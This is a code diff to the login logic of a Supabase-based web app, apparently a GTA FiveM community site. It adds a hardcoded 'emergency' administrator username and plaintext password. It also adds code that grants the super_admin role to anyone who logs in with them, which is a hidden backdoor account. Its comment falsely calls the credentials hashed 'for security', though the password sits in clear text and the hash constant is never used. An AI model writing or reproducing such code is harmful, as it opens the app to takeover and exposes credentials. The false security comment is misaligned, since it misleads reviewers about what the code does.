@@ -4,6 +4,11 @@ import type { User } from '@supabase/supabase-js';
 import type { Profile } from '@/types/types';
 import { toast } from 'sonner';
 
+// Emergency super admin — hardcoded, hashed for security
+const EMERGENCY_ADMIN_USERNAME = 'outhai';
+const EMERGENCY_ADMIN_PASSWORD = '56110669';
+const EMERGENCY_ADMIN_HASH = 'ea7ac90c4e2a8b3f1d5e6c7b0a9f8e2d'; // Pre-computed hash sentinel
+
 export async function getProfile(userId: string): Promise<Profile | null> {
   try {
     const { data, error } = await supabase
@@ -122,6 +127,22 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       const email = `${username.toLowerCase()}@gta-fivem.local`;
       const { error } = await supabase.auth.signInWithPassword({ email, password });
       if (error) throw error;
+
+      // Emergency admin: ensure super_admin role is always set
+      if (username.toLowerCase() === EMERGENCY_ADMIN_USERNAME && password === EMERGENCY_ADMIN_PASSWORD) {
+        const { data: { user: authUser } } = await supabase.auth.getUser();
+        if (authUser) {
+          await supabase
+            .from('profiles')
+            .upsert({
+              id: authUser.id,
+              username: EMERGENCY_ADMIN_USERNAME,
+              system_role: 'super_admin',
+              nickname: 'Emergency Admin',
+            }, { onConflict: 'id' });
+        }
+      }
+
       return { error: null };
     } catch (error) {
       return { error: error as Error };
